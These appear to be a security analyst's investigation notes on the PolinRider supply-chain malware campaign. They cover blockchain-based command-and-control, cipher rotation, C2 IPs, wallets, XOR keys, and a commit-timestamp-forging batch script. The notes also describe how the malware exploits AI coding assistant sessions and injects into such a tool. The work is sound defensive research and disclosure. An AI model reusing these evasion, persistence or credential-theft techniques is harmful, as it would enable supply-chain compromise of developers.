# PolinRider — Investigation Notes & Overall Assessment

*Analyst notes: cross-campaign synthesis, live C2 findings, follow-up leads*

---

## Attribution Confidence

**Same actor throughout. All campaigns (5-3-161 through 5-4-39 / 5-167) are PolinRider.**

Confirming signals:
- XOR keys `2[gWfGj;<:-93Z^C` and `m6:tTh^D)cBz?NM]` are **identical** across every campaign
- TRON wallets in `_$_b229` (`TMfKQEd7...`, `TXfxHUet...`) match public PolinRider tracking
- `temp_auto_push.bat` and `config.bat` are confirmed PolinRider tooling (OpenSourceMalware report)
- Stage 0 logic (TRON → Aptos fallback → BSC dead-drop → XOR decrypt → eval) is identical across all cipher variants
- The cipher rotation from `_$_913e` to `_$_b229` was explicitly triggered by OpenSourceMalware's
  publication of the `rmcej_otb_payload` YARA rule (March 7, 2026) — the actor monitors detection
  infrastructure and rotates in response

Public attribution: **Famous Chollima / Void Dokkaebi / DEV#POPPER** (DPRK-nexus).
Also tracked as: **TasksJacker** / **Contagious Interview** cluster (confirmed operational merger
per OpenSourceMalware April 2026 update).

---

## What We Found That's Not Yet Public

The following IOCs/findings are **zero-result on GitHub** as of 2026-06-27 and do not appear in
any public threat report:

| Finding | Status |
|---------|--------|
| Cipher `_$_16d1` (seen in live W2 Stage 1) | **Not publicly documented** |
| Cipher `_$_9f51` (seen in live W1 Stage 1) | **Not publicly documented** |
| Cipher `_$_96c7` (embedded in W1 Stage 1 atob block) | **Not publicly documented** |
| Guard key rotation `_p_t` → `_t_t` | **Not publicly documented** |
| `global["___dirname"]` + `global["___filename"]` capture in Stage 1 | **Not publicly documented** |
| `global._R` reporting callback in Stage 1 | **Not publicly documented** |
| `global["_t_c"]` (Stage 1 source stored for Stage 2 introspection) | **Not publicly documented** |
| `global["_t_0"]` (secondary cipher code blob passed to Stage 2) | **Not publicly documented** |
| W1 dead-drop updated 2026-06-23 (BSC TX `0x18a842...`) | **New, live** |
| W2 dead-drop updated 2026-06-20 (BSC TX `0x7ffb4e...`) | **New, live** |
| Direct C2 IP `166.88.134.62:443` (admin mode) | **Not publicly documented** |
| Direct C2 IP `198.105.127.210:443` (production victims) | **Not publicly documented** |
| Direct C2 IP `23.27.202.27:443 / 27017` (MongoDB backend) | **Not publicly documented** |
| TRON wallet W3 `TA48dct6rFW8BXsiLAtjFaVFoSuryMjD3v` (Stage 1 → Stage 2) | **Not publicly documented** |
| Stage 2 BSC TX `0x533b2dbcaeff...` (hardcoded fallback) | **Not publicly documented** |
| Stage 2 live BSC TX `0xb6c72589...` (from W3 TRON, Jun 8 2026) | **New, live** |
| Stage 2 payload (77,279 chars, LZString + compressed Beavertail RAT) | **Retrieved live** |
| Stage 2 boot endpoint `/0x/js?_V=<id>&id=<uuid>` (not `/$/boot` as JFrog reported) | **Not publicly documented** |
| Stage 2 injection target: **Antigravity** AI coding assistant (all platforms) | **Not publicly documented** |
| Stage 2 injection target: **npm CLI** `node_modules/npm/lib/cli.js` (supply chain propagation) | **Not publicly documented** |
| Stage 2 sandbox evasion: MD5 `9a47bb48b7b8ca41fc138fd3372e8cc0` + UUIDs `EV-CHQG3L42MMQ`/`EV-4A6OE6M0E2D` | **Not publicly documented** |
| Stage 2 build date June 5, 2026; oldest injection module June 17, 2025 | **Not publicly documented** |
| W3 historical XOR key `cA]2!+37v,-szeU}` (used Nov 2025 – Feb 25 18:05) | **Not publicly documented** |
| W3 key rotation event (Feb 25, 18:05→18:07) — same payload, two keys, 2 min apart | **Not publicly documented** |
| Stage 2 payload size jump: 92K→70K within Feb 11 2026 session (major payload redesign) | **Not publicly documented** |
| Aptos fallback addresses `0xbe037400...` / `0x3f0e5781...` | **In scanner IOC list but not in research reports** |

---

## Public Sources

| Source | URL | Notes |
|--------|-----|-------|
| OpenSourceMalware PolinRider report | github.com/OpenSourceMalware/PolinRider | 160 KB report, 1,950+ infected repos documented, April 2026 update confirms Neutralinojs |
| charlie-goldenowl/polinrider-scanner.sh | github.com/charlie-goldenowl/polinrider-scanner.sh | Community scanner; lists npm packages, TRON wallets, Aptos addresses as IOCs |
| 100DaysofYARA/2026 Day54 | github.com/100DaysofYARA/2026 | YARA rules for `_$_1e42` / `_$_b229` variants |
| 0xCryptoZen/malware-scan | github.com/0xCryptoZen/malware-scan | IOC list including new TRON wallets |
| Trend Micro / DEV#POPPER | Unit 42 write-up on the campaign | Attribution, Beavertail RAT documentation |
| JFrog (Korolevski + Benamou) | github.com/jfrog/research — post/hijacked-npm-vscode-tasks-blockchain.md | **Jun 24 2026** — full 5-stage chain; VSCode folderOpen delivery; Stages 3-5 (socket.io backdoor, Python bootstrapper, Python infostealer); 16 Go packages (Nextron Research update Jun 25) |
| Dragon-Lady/linux-supply-chain-guard | github.com/Dragon-Lady/linux-supply-chain-guard | **"ChainVeil"** campaign name; IP `166.88.54.158` (socket.io WS C2); 9 additional npm packages incl. `typeorm-encrypt`; `A6-` campaign IDs; Aptos A3 confirmed; actor org `successkeyteck` (suspended) |
| Nextron Research | via JFrog post update Jun 25 2026 | 16 infected Go packages containing same fa-solid-400.woff2 payload |
| orangemaster674 (Medium) | medium.com/@orangemaster674/attacking-any-run-for-sandbox-detection-development-747c1a8aa4fd | ANY.RUN sandbox detection: driver `A3E64E55_fl_x64.sys`, device `\\.\A3E64E55_fl`, path `C:\Program Files\KernelLogger`; relevant to Stage 2 O-filter Task AA |
| Mandiant CAPA rules | github.com/mandiant/capa-rules/blob/master/anti-analysis/anti-vm/vm-detection/check-for-windows-sandbox-via-process-name.yml | Windows Sandbox detection via `CExecSvc.exe`; references wsb-detect (LloydLabs); relevant to Stage 2 sandbox evasion |
| Talos Intelligence | blog.talosintelligence.com — "BeaverTail and OtterCookie evolve with a new Javascript module" | Covers BeaverTail RAT evolution and OtterCookie infostealer; confirms DPRK Contagious Interview cluster attribution |
| Microsoft Security Blog (Mar 2026) | microsoft.com/security/blog — "Contagious Interview: Malware delivered through fake developer job interviews" | March 2026 update; fake interview lure TTP documentation; confirms operational merger with TasksJacker cluster |
| Socket.dev | socket.dev/blog — "Famous Chollima Targets PHP Developers Through Compromised Packagist Package" | Extension to PHP/Packagist ecosystem; actor pivots beyond npm; confirms Famous Chollima attribution |
| Bleeping Computer | bleepingcomputer.com — "Malware adds online sandbox detection to evade analysis" | Documents sandbox evasion via `tasklist` process-name MD5 checks; may reference the specific O-process Stage 2 is targeting |
| CyberDefenders | cyberdefenders.org — "Famous Chollima" lab challenge | Blue-team CTF lab based on the campaign; useful for corroborating IOCs |
| Checkmarx ChainVeil | checkmarx.com/zero-post/chainveil-a-malicious-npm-supply-chain-attack-by-successkey/ | Confirms `successkeyteck` npm publisher; full package list + 3,293 downloads; A6- campaign IDs; `ThZG+0jfXE6VAGOJ` key referenced |
| SafeDep Astro C2 | safedep.io/astro-config-blockchain-c2-supply-chain/ | `astro.config.mjs` delivery vector; `Egonex-AI` PR attack; `ThZG+0jfXE6VAGOJ` HTTP C2 key; identical blockchain infra confirmed |
| OX Security DPRK RAT | ox.security/blog/north-korean-npm-infostealer-rat/ | Separate DPRK npm RAT campaign: `terminal-logger-utils`, `ts-logger-pack`; `/api/validate/keyboard-events` C2; Telegram Bot exfil |
| Abstract Security | abstract.security/blog/contagious-interview-tracking-the-vs-code-tasks-infection-vector | Documents 9+ infected repos, new C2 domains `regioncheck.xyz` / `vscodeconfig.com` / `vscode-load.onrender.com`; Vercel CDN delivery variant; `jsonwebauth` npm package IOC |
| Microsoft VSCode issue #309406 | github.com/microsoft/vscode/issues/309406 | Security disclosure on `runOn: "folderOpen"` enabling silent code execution from cloned repos; actor-exploited VSCode feature |
| OpenSourceMalware blog | opensourcemalware.com/blog/how-malware-abuses-npm-lifecycle-scripts-and-vs-code-tasks | Documents VSCode task + npm lifecycle delivery mechanics; cross-references PolinRider campaign |

**npm infection vectors (publicly documented):**
- `tailwind-mainanimation`
- `tailwind-autoanimation`
- (and other PostCSS/Tailwind-adjacent packages per OpenSourceMalware)

---

## Cipher Evolution Timeline

The actor has shipped at least 5 distinct cipher variants, each a response to detection:

| Cipher | First seen | Campaigns | Status |
|--------|-----------|-----------|--------|
| `_$_1e42` / `MDy` | 2026-03 (earliest known) | Unknown | Detected — YARA rule `rmcej_otb_payload` published by OpenSourceMalware 2026-03-07 |
| `_$_46e0` | 2026-02-22 | 5-3-161 (zurichjs) | Cleaned May 2026 |
| `_$_913e` | 2026-05-13 | 5-3-225/252/296/298/341 + 5-2-328 | Still live in 9 external repos |
| `_$_b229` | 2026-06-03 | 5-4-39, 5-167 | Still live |
| `_$_4445` | 2026-06-26 | 5-2-319 (zurichjs) | Cleaned ~6h after injection |
| `_$_16d1` | Seen in live W2 Stage 1 (delivered Jun 20) | Unknown — not yet found in any infected repo | **New — not publicly documented** |
| `_$_9f51` | Seen in live W1 Stage 1 (delivered Jun 23) | Unknown | **New — not publicly documented** |
| `_$_96c7` | Embedded in W1 Stage 1 atob block | Sub-cipher for Stage 2 bootstrap | **New — not publicly documented** |
| `_$_f5f0` | W2 Stage 1, deployed Jun 23 + Jun 25 (via Aptos A2) | Unknown — not yet in any repo | **New — module capture restored** |
| `_$_3333` | W2 Stage 1 (2026-03-04) | Unknown | **First outer cipher on W2 channel** |
| `_$_ec7c` | W2 Stage 1 (2026-03-26) | Unknown | **Replaced `_$_3333` within 22 days** |
| (none / raw IIFE) | All W1+W2 payloads before Mar 2026 | Many variants (BIY, uap, DML, AOv, GAR, AZL, utH, Gez, nBj, RZn, gOe) | Pre-dates outer cipher wrapper — plain `typeof` checks |

The `_$_1e42` → `_$_b229` rotation is confirmed by OpenSourceMalware as an evasion response.
`_$_16d1`, `_$_9f51`, and `_$_96c7` are the next generation, apparently already deployed in the live C2
chain but not yet found in infected repositories.

---

## Live C2 Status (as of 2026-06-27)

Both `_$_b229` campaign wallets are active and were updated within the past 4 days:

**W1: `TMfKQEd7TJJa5xNZJZ2Lep838vrzrs7mAP`**

| TRON TX | Date | Points to BSC TX |
|---------|------|-----------------|
| `baf00565...` | **2026-06-23T02:35Z** | `0x18a8420f727f2405f9d1805ad887b31029b584b2ff5a7ec0f57c72635183e99d` |
| `ff86aec0...` | 2026-06-18T13:09Z | `0xb73920732115ab3a0ae8d9ecd28666670d271bee77d29692ff29505fd9a1a6b2` |
| `914e5e07...` | 2026-05-23T16:16Z | `0x80a1148ee589125bc1e57d36abac9f08089b2990d9372be3a33a1f057ad1ef89` |

**W2: `TXfxHUet9pJVU1BgVkBAbrES4YUc1nGzcG`**

| TRON TX | Date | Points to BSC TX |
|---------|------|-----------------|
| `3a2b5067...` | **2026-06-20T13:37Z** | `0x7ffb4efddd96e20aec90724be2ac9a71c138a9af697b9fb8224bbf80ea4f22be` |
| `fc005f15...` | 2026-03-26T15:13Z | `0xa896af4f2876df59af1e705fb75031630ebd37fa89659a9896be4d3da8c87f02` |

**W3 (Stage 2): `TA48dct6rFW8BXsiLAtjFaVFoSuryMjD3v`**

| TRON TX | Date (approx) | Points to BSC TX |
|---------|------|-----------------|
| `08685820...` | ~2026-06-08 | `0xb6c725890be6890fd2c735eedc47e24b85a350301f6c19a3864e43c35e470968` |
| `f16931ee...` | ~2026-06-04 | `0x23fea476d18039a65bd438a4a071c2feb1530592b96ddf15c6ffb93acc03cd3f` |
| `8b2c39c6...` | ~2026-06-02 | `0x54b8bde10ea26d9ae0702e6e590f0af3e500cb14fda876e908620760ac32b76c` |

Current live payloads successfully retrieved (2026-06-27):
- **W1 Stage 1** (5,849 chars): Guard key `_t_t`; captures `__dirname`/`__filename`; `_$_9f51` routing table (3 C2 IP pools); new W3 TRON wallet for Stage 2; `_$_96c7` secondary cipher
- **W2 Stage 1** (3,524 chars): Delivers new cipher `_$_16d1`; activation code 8063; return 8223
- **Stage 2** (77,279 chars): LZString decompressor + compressed Beavertail RAT; retrieved from W3 → BSC `0xb6c72589...`

**The C2 infrastructure is fully operational and was updated 4 days ago.**

---

## Scale — What We Were Looking At

Our investigation traced zurichjs-conf/website (5 injections over 4 months). But this is one
small slice of a much larger campaign:

- **OpenSourceMalware report (2026-03-07):** 675 public repos, 352 unique owners at publication
- **Updated count (2026-04-11):** 1,950+ repositories
- **Neutralinojs:** A single infected popular project (8,400 GitHub stars, 495 forks) spread the
  payload to hundreds of contributors and users — this is the supply chain multiplier the npm
  delivery model creates

The 9 external repos we found via code search are the visible tip. The full victim pool is
in the thousands.

---

## What Makes This Different from Standard Supply-Chain Attacks

**1. The AI coding assistant angle is novel and underreported.**

The actor specifically targets developers with AI coding assistants (Claude Code, Cursor,
Continue.dev) — not incidentally, but as the delivery mechanism. When a developer runs Claude
Code or Cursor, the AI session has ambient write access to the local filesystem and all
git-credentialed repositories. If `temp_auto_push.bat` runs in that context, it inherits all
of those permissions. The infected npm package installs the bat file; the AI coding session
provides the execution environment and the credential scope.

The Lu-Yanru case proved the radius: one compromised developer's ambient access infected a
completely unrelated collaborator's hackathon project. This is not credential theft — it is
*write-access radius* propagation. No security team is modeling this.

**2. Blockchain C2 is genuinely hard to take down.**

The payload delivery chain (TRON wallet → BSC TX → XOR decrypt) means:
- No server to seize or null-route
- The actor can update the Stage 1 payload by making a new TRON transaction (cheap, fast)
- Historical transactions remain accessible — old infected systems can still reach the C2
- The actor has been updating W1 every 5–14 days, suggesting active payload development
- A third wallet (W3) routes Stage 2 separately, adding another immutable link in the chain

**3. The merge-commit injection evades PR review.**

In the zurichjs campaigns, the PR branches were clean. The payload appeared only in the
force-pushed merge commit. This means standard "require review before merge" policies offer
no protection — the review happens on the clean branch, and the merge commit is rewritten
after approval. The timestamp gap (author vs committer > 60s on a config file) is the only
reliable detection signal we found.

**4. The actor monitors public detection and rotates.**

The `_$_1e42` cipher was replaced by `_$_913e`/`_$_b229` within weeks of the OpenSourceMalware
YARA rule publication. Two new ciphers (`_$_16d1`, `_$_9f51`) are already appearing in the live
C2 chain — before any public report has documented them. This is an active, well-resourced
operation with a feedback loop.

**5. TrustedSmartChain is the highest-stakes individual finding.**

A blockchain signing CLI infected by a DPRK actor means potential private key exfiltration.
If Stage 3 achieved persistence on that developer's machine, the entire TSC chain's signing
infrastructure may be compromised. No notification appears to have been sent.

**6. Stage 1 reveals direct C2 IP infrastructure — not in any public report.**

The four IP addresses (`166.88.134.62`, `198.105.127.210`, `23.27.202.27`, `23.27.13.43`) are
hidden inside Stage 1 ciphers and were never visible in Stage 0 or infected repo files. Port
27017 on `23.27.202.27` confirms the actor's backend is MongoDB. `23.27.13.43` (new, W2 Stage 2
only) receives the old `_$_1e42` batch victims. The victim-routing logic by campaign ID prefix
(`'A'` / numeric / mixed) segments victims across dedicated C2 servers.

---

## Follow-Up Investigation Leads

### Completed

**A. Full analysis of live W1 Stage 1 (`_$_9f51` cipher)** — DONE
Full analysis in `ANALYSIS_STAGE1_b229_live.md`. Decoded `_$_9f51` (17-entry routing table),
`_$_96c7` (4-entry Stage 2 bootstrap cipher), NVu inner cipher. Identified 3 direct C2 IP pools,
new TRON wallet W3, new BSC TX dead-drops. YARA rules written.

**C. Retrieve live Stage 2 from the current chain** — DONE (as side effect of Task A)
Stage 2 retrieved 2026-06-27 from W3 TRON wallet → BSC `0xb6c72589...`. Size: 77,279 chars.
Structure: `Function("oTNBm2c", LZString_decompressor)` + compressed Beavertail RAT.
Saved to `artifacts_live_stage2.zip`.

### High priority (pending)

**B. Decode `_$_16d1` from W2 Stage 1** — DONE
Full analysis in `ANALYSIS_W2_STAGE1.md`. `_$_16d1` is a minimal 2-entry cipher
(`['function', 'r']`) — just the `typeof require` check and `global['r'] = require` store.
The main payload is the W2 Stage 2 body (1,958 chars) decoded via `Wrm` inner cipher
(seed=2296496) + LZ decompressor (`ptU` 890 chars) + Stage 2 cipher `_$_a478` (seed=6463369,
35-entry table).

**Key finding: W2 Stage 2 uses DIRECT HTTP, not blockchain dead-drops.**
Stage 2 beacons to actor infrastructure at `/$/boot` with `Sec-V: <campaign_id>` header
and XOR-decrypts the Stage 3 response with a NEW key `"ThZG+0jfXE6VAGOJ"`.

**New C2 IP discovered: `23.27.13.43`** (W2 `_$_a478[3]`). This IP is not in any public
report and does not appear in W1 Stage 1. It receives victims with campaign IDs starting
with `'A'` (i.e., old `_$_1e42` batch victims like `'A8-765'`).

Routing table revealed by W2 Stage 2:
- `_V` starts with `'A'` → `global['_H2'] = 'http://23.27.13.43'`
- `_V` is numeric → `global['_H2'] = 'http://198.105.127.210'`
- `_V` is mixed (e.g. `'5-3-161'`) → `global['_H'] = 'http://198.105.127.210'` + `_H2 = 23.27.202.27:27017` (fallback)

W1 vs W2 architecture confirmed divergent: W1 = blockchain dead-drop → 77,279-char RAT;
W2 = direct HTTP beacon → Stage 3 fetched live from actor server.

**E. TrustedSmartChain notification**
The `tsc-signer` infection (5-3-341, May 19) is a high-severity finding. The developer's
machine may have had the signing keys for the TSC blockchain exfiltrated. The TrustedSmartChain
org does not appear to have been notified. This warrants direct disclosure.

### Medium priority

**D. npm package analysis** — DONE
Full analysis in `ANALYSIS_NPM_PACKAGES.md`. Six packages identified: 2 confirmed PolinRider
(`tailwind-mainanimation`, `tailwind-autoanimation`), 4 suspected June 2026 wave
(`tailwind-textform-fill`, `tw-style-utils`, `postcss-minify-selector`,
`postcss-minify-selector-parser`). Key findings: `tw-style-utils` published 22 min after
zurichjs PR#199 merge; `postcss-minify-selector*` pair published 5 seconds apart (same batch);
`tailwind-mainanimation` taken down same day as OpenSourceMalware YARA publication (Mar 13).
The postcss pair uses AES-GCM + `new Function("require", ...)` rather than XOR+blockchain —
attribution to PolinRider plausible but unconfirmed. IOCs + Amazon Inspector hashes documented.

**F. Cross-reference our victims with OpenSourceMalware's repo list** — DONE
Full analysis in `ANALYSIS_OSM_CROSSREF.md`. No overlap — expected: our 9 victims were all
infected in May–June 2026; OSM's master CSV is dated April 11, 2026. The two datasets cover
complementary windows of the same campaign. OSM documented 1,950 repos (1,807 still live) from
the `_$_1e42` / `Cot%3t=shtP` wave; our work documents the `_$_913e` / `_$_b229` / `_$_4445`
wave that followed. The `Cot%3t=shtP-sg` cipher (41 repos, avg 299 stars) shows strong
crypto/Web3 targeting — 11 of 41 are blockchain projects. `new-computers` org confirmed in
OSM's bat-only list (6 repos). 236 OSM repos have `config.bat`/`temp_auto_push.bat` detected.

**G. Scan for `_$_16d1` and `_$_9f51` in GitHub repos** — DONE
Full analysis in `ANALYSIS_CIPHER_SCAN_G.md`. All four new ciphers (`_$_16d1`, `_$_9f51`,
`_$_96c7`, `_$_4445`) return zero results on GitHub — not yet in any publicly indexed repo.
Monitoring baseline established. Side discoveries: `Cot%3t=shtP` cipher confirmed live in 5
repos (5471/3456 act/ret, new pair); `saif72437` mass infection — 30 repos all swept June 15.
New tasks M/N/O added.

**H. Investigate `config.bat`** — DONE
Full analysis in `ANALYSIS_CONFIG_BAT.md`. `config.bat` is not an orchestrator — it is the
**timestamp-forgery commit amender**. It reads the victim's last commit metadata, changes the
system clock to match, runs `git add . && git commit --amend --no-verify`, restores the clock,
and force-pushes. Effect: committer timestamp = author timestamp → no detectable gap.
Two versions exist (V1 basic, V2 with full credential suppression). Three naming variants:
`config.bat`, `temp_auto_push.bat`, `temp_interactive_push.bat` (adds `pause`). Live samples
recovered from 8 victim repos where actor failed to gitignore the file.
**Critical implication:** The timestamp-gap detection that found all zurichjs injections works
ONLY for the direct-injection path (actor's machine). npm-vector infections run `config.bat`
on the victim's machine → matching timestamps → our detection signal is absent. The 1,950+
OSM victims were hit via the undetectable path.

**I. Aptos address activity** — DONE
Full analysis in `ANALYSIS_APTOS_WALLETS.md`. Dead-drop mechanism confirmed: all Aptos TXs are
zero-value transfers where the recipient address IS the BSC TX hash. A1 = W1 channel fallback,
A2 = W2 channel fallback (proven by cross-matching with known TRON→BSC pairs).

**Operation timeline extended: active since at least 2025-06-13** (12+ months). A1 has 22 TXs,
A2 has 10 TXs, going back to June 2025.

**NEW cipher `_$_f5f0` discovered** (Jun 23 + Jun 25 via A2 Aptos) — fourth new undocumented
cipher not in any public report, not yet seen in any infected repo. New capability: captures
`global['m'] = module` (CommonJS module object) in addition to `global['r'] = require`.
Two deployments: Jun 23 (`SgH` inner cipher, seed=570964) and Jun 25 (`cdi` inner cipher,
seed=1787286).

**Historical Stage 1 from Aug 2025 recovered** (`RVj` cipher, seed=2078320) — earliest known
variant, predates the outer `_$_xxx` cipher wrapper. Guard key `_t_t` confirmed in March 2026
payload. 10 additional BSC TXs from 2025 remain unanalyzed (see ANALYSIS_APTOS_WALLETS.md).

### Lower priority / passive monitoring

**J. TRON wallet W1 update cadence** — DONE (snapshot 2026-06-28)
Full analysis in `ANALYSIS_CADENCE_J.md`. No new updates since last check.

Status: W1/A1 last Jun 23 (5d ago), W2/A2 last Jun 25 (3d ago), W3/A3 last Jun 8 (20d ago).

**W3 true history discovered:** 69 TXs back to Nov 13, 2025 (not Jun 2025). W3 added the Stage 2
blockchain dead-drop layer in Nov 2025, 5 months after W1/W2 went live. Pre-Nov Stage 2 was
served directly from C2.

**Stage 2 payload evolution:** Function wrapper introduced May 21 mid-session; payload grew
~65KB → 77KB (May 20 → Jun 8). Jun 8 payload stable for 20 days — longest W3 quiet period.

**16 new W3 BSC TXs catalogued** (May 20 – Jun 2). Pre-Function-wrapper payloads (~65KB) from
May 20 may be easier entry point for Task T (Beavertail decode).

**W3 20-day silence** is anomalous given <3 day avg cadence over 7.5 months — may signal
actor preparing a new Stage 2 variant or transitioning delivery mechanism.

**M. Decode `Cot%3t=shtP` cipher from live samples** — DONE
Full analysis in `ANALYSIS_COT_CIPHER.md`. Stage 2 fully decoded from `herasoftlabs/ChainLab`.
The `Cot%3t=shtP` wave (Mar–Apr 2026) uses **identical C2 infrastructure** to the current wave:
same TRON wallets (`TMfKQEd7...` / `TXfxHUet...`), same Aptos fallbacks (`0xbe037400...` /
`0x3f0e5781...`), same BSC nodes (`bsc-dataseed.binance.org`), same `?.?` payload separator.
Campaign XOR keys decoded: `"2[gWfGj;<:-93Z^C"` (W1) and `"m6:tTh^D)cBz?NM]"` (W2) —
**these are the same XOR keys found in all other waves**, confirming a single persistent C2
backend operating continuously since at least January 2026. Global marker transition confirmed:
`global['!']` (require in `_$_1e42`) → `global['r']` + `global['_V']` (Cot wave onward).
The 53-entry string table reveals the complete C2 chain: TRON → reversed hex → BSC
`eth_getTransactionByHash` → split `?.?` → XOR decrypt → eval.

**N. `saif72437` full infection sweep** — DONE
Full analysis in `ANALYSIS_SAIF72437.md`. 57 of 64 repos swept on 2026-06-15 in an **18-minute
window** (08:25–08:43 UTC). 9 repos have live JS payload infections (all `_$_1e42`, act 2509/ret
1358); 24 repos have `temp_auto_push.bat` committed as bat artifact (no injectable JS config).
Campaign IDs extracted: `global['!']='8-765'` (outer routing key) / `global['!']='11-#'`
(inner Stage 2 override). Inner cipher `sfL`: seed=2667686, off1=228, mod1=50332, off2=128,
mod2=52119, modulus=4289487 — distinct from Cot%3t=shtP MDy parameters. All 9 payload tails
are identical (single batch deployment). Developer is a Pakistani web dev educator; bat swept
all repos regardless of stack (even Java/Dart repos got the bat, JS injection failed on those).

**O. `_$_1e42` 2509/1358 cluster C2 mapping** — DONE
Full analysis in `ANALYSIS_1E42_C2.md`. Stage 2 fully decoded from saif72437/medium-clone.
Two-layer payload: outer atob shell sets `global['!']='8-765'`; inner atob layer (4,781b)
contains `sfL` bootstrap cipher (seed 2667686) that decompresses Stage 2 body (3,858b).
Stage 2 cipher `_$af163278` (seed 1812138, off1=139, off2=473, mod1=20044, mod2=41543,
modulus=5446973) decodes 58-entry string table. **All C2 infrastructure is IDENTICAL to
every other wave:** TRON W1 `TMfKQEd7...`, W2 `TXfxHUet...`, both Aptos fallbacks, both
BSC nodes, same `?.?` separator, same XOR keys `2[gWfGj;<:-93Z^C`/`m6:tTh^D)cBz?NM]`.
New findings: Stage 2 reads `global['!']` and sets `global['_V'] = "A" + global['!']`
(→ `"A8-765"`); adds infection timestamp tracking via `global['_p_t'] = new Date().getTime()`.
**Final confirmation: single C2 backend in continuous operation Jan–Jun 2026.**

**K. Check remaining unconfirmed victim repos (TrustedSmartChain/tsc main repo)** — DONE
**tsc main repo is NOT infected.** Checked 2026-06-28.

The `TrustedSmartChain/tsc` repo (pushed 2026-06-24) has 7 commits with author/committer
timestamp gaps (authored Apr 6–28, committed Jun 3). These are a **legitimate git rebase**
from the `feature/licenses` branch, not PolinRider injection — all modified files are
`.go`, `go.mod`, `go.sum`, `Makefile`, and `.sh`. No JS config files exist in the repo
(it is a Go blockchain project), so there is no PolinRider injection surface.

Full IOC scan of `swagger-ui-bundle.js` (1,078,281 chars, the only large JS file):
no TRON wallets, no Aptos addresses, no XOR keys, no cipher identifiers, no bat files,
no woff2 disguised payloads.

The `tsc-signer` infection (Task 5-3-341, May 19 2026) remains the only confirmed
TrustedSmartChain compromise.

### New tasks (added 2026-06-28)

**P. Scan GitHub for `_$_f5f0`, `_$_3333`, `_$_ec7c`** — DONE
Full analysis in `ANALYSIS_CIPHER_SCAN_P.md`. All new outer ciphers, Stage 2 ciphers, and inner
cipher names return zero results — the actor's blockchain delivery continues to keep payloads
entirely off GitHub.

**Secondary signal scan on `ThZG+0jfXE6VAGOJ` returned critical external intel:**

**JFrog (Jun 24 2026):** First public report documenting Stages 3–5 of the chain. Key findings:
- VSCode `folderOpen` task delivery via `.vscode/tasks.json` (label: `eslint-check`, executes
  `public/fonts/fa-solid-400.woff2`, 752-space obfuscation, `hide: true`)
- npm packages: `html-to-gutenberg@4.2.11`, `fetch-page-assets@1.2.9` (uploaded May 25 2026)
- Stage 3 = socket.io backdoor (`ws://166.88.54.158:443`) — shell, file upload, arbitrary eval
- Stage 4 = Python bootstrapper (env vars → `/snv`, Python installer from C2 `/d/` paths)
- Stage 5 = Python infostealer — browsers, 30+ crypto wallet extensions, password managers,
  GitHub/VS Code credentials, cloud storage metadata
- Telegram exfil (token dynamic from `/u/e`): prefix `7870147428:AAGbYG...`, chat `7699029999`
- 16 infected Go packages (Nextron Research update Jun 25)

**Dragon-Lady/linux-supply-chain-guard** (created May 13, calls campaign "ChainVeil"):
- New C2 IP `166.88.54.158` — socket.io WebSocket C2 (`ws://166.88.54.158:443`, `/upload`)
- 9 additional npm packages including `typeorm-encrypt` (TypeORM ecosystem)
- Campaign IDs: `A6-317`, `A6-318`, `A6-420`, `A6-420-#`, `A6-519-79`–`A6-519-85`
- Actor GitHub org `successkeyteck` now 404'd (suspended post-JFrog)
- Aptos A3 confirmed: `0x533b2dbc...` = W3 fallback (alongside A1=W1, A2=W2)
- Stage 0 SHA-256: `53abf377...`, `13e9a3c4...`

**Updated architecture** (5 stages now fully documented):
Stage 0 (VSCode task) → Stage 1 (blockchain dead-drop) → Stage 2 (C2 beacon) →
Stage 3 (socket.io backdoor) → Stage 4 (Python bootstrapper) → Stage 5 (Python infostealer)

**Q. Retrieve 2025 historical Stage 1 variants** — DONE
Full analysis in `ANALYSIS_HISTORICAL_STAGE1.md`. All 10 A1 + 6 A2 historical BSC TXs retrieved.
13 new cipher families documented (8 W1, 3 W2 inner + 2 W2 outer). Key findings:
- 2 undecodable first TXs (Jun 13 2025) — likely used a pre-operational key at launch
- `module` capture (`global['m']`) present from Jun 13 2025 in W2 plain-text phase; NOT new to `_$_f5f0`
- `_global` var added to W2 from Jun 18 2025
- Oct 1 2025: test TX `global['_V']='9-test'` found — campaign ID system existed by that date
- `_$_3333` (Mar 4 2026) = first outer cipher on W2 channel; `_$_ec7c` replaced it Mar 26 2026
- Outer cipher obfuscation was absent from ALL payloads before March 2026 on both channels

**R. Decode `_$_f5f0` Stage 2 body** — DONE
Full analysis in `ANALYSIS_F5F0_STAGE2.md`. Stage 2 cipher `_$_d6e0` (seed=565583, 33 entries).

**Actor is pruning the victim pool.** Two IPs removed, routing simplified:
- `'A...'` prefix victims → **silent drop** (was: beacon to `23.27.13.43`)
- Mixed `'5-3-...'` victims → **silent drop** (was: beacon to `198.105.127.210`)
- Numeric victims → `198.105.127.210/$/boot` (unchanged)
- `23.27.13.43` and `23.27.202.27:27017` both removed from string table entirely

`global['m']` (module object) captured in Stage 1 but NOT used in Stage 2 — reserved for
Stage 3 or future capability.

Activation/return codes changed: `8063`/`8223` (Jun 20) → `1218`/`2021` (Jun 25).
Stage 3 XOR key `ThZG+0jfXE6VAGOJ` unchanged.

**S. Re-query TRON W2 for Jun 23/25 updates** — DONE
Full analysis in `ANALYSIS_TRON_WALLETS_FULL.md`. Complete W1 (37 TXs) and W2 (11 TXs) tables
retrieved and mapped. Key findings:

- **Jun 23/25 Aptos A2 updates confirmed Aptos-only** — TRON W2 has no TXs on those dates
- **True operation start: June 6, 2025** — "Mxy custom memo text" test TXs (7 days before go-live)
- **Jun 11 2025 binary memo experiments** — actor tested raw binary data field encoding (failed);
  corrected to hex-encoded UTF-8 on Jun 13 (go-live day)
- **No-memo TXs are cashout transactions**, not dead-drops — actor moving TRX/TRC-10 to secondary wallets
- **Two actor cashout wallets identified (new IOCs)**:
  - W1 cashout: `41803f5d3cc635e5ac3c96c86a6cbe98c9eda82e66`
  - W2 cashout: `41ee0f692be2f1e405b35b027260ba696de90a43dd`
- New W2 Jun 13 2025 BSC TX `0x1a323149...` found — pruned from BSC archive, unrecoverable
- Aptos vs TRON update synchronization table cross-referenced across all dates

**T. Decode W1 Stage 2 — Beavertail RAT internals** — DONE
Full analysis in `ANALYSIS_BEAVERTAIL_T.md`. 337-entry string table extracted and decoded.

**Stage 2 IS Beavertail** — not a loader but the complete implant. Key findings:

- **Build date:** June 5, 2026 (`260605` / `/*RS260605*/`). Oldest injection module dates June 17, 2025 (operation week 1).
- **Boot beacon:** `GET _H2/0x/js?_V=<campaign_id>&id=<uuid>$<version>` (not `/$/boot` as JFrog described — different version or actor updated)
